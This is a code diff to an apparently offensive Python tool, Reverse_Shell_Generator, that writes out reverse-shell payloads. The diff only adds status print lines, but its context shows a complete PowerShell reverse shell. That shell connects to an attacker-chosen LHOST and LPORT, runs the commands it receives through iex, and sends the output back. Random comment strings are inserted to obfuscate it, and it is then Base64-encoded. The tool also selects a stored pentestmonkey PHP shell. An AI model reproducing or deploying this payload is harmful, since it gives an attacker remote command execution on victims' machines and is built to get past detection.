@@ -105,6 +105,10 @@ class Reverse_Shell_Generator:
                  Random_Value ='<# '+''.join(secrets.choice(Table) for i in range(20))+' #>'
                  self.result = '$client = New-Object '+ Random_Value +' System.Net.Sockets.TCPClient("'+f'{self.args.LHOST}'+'",'+f'{self.args.LPORT}'+'); '+Random_Value+' $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}; '+Random_Value+' while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'+Random_Value+'$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + $(gl) + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
                  self.Base64() 
+                 print('\n'+'='*30 +'\n') 
+                 print('[*] Generated  : Done !!')
+                 print('[*] File Name  : powershell.ps1')
+                 print('[+] File Path  : ' +path+'/')       
                 
             elif 'php' in self.args.type  and self.args.pentestmonkey :
                   if os.path.exists('./Store_shell/PHP.php'):
@@ -299,7 +303,3 @@ class Reverse_Shell_Generator:
                 exit()               
 if __name__=='__main__':
    Reverse_Shell_Generator()  
-
-
-
-
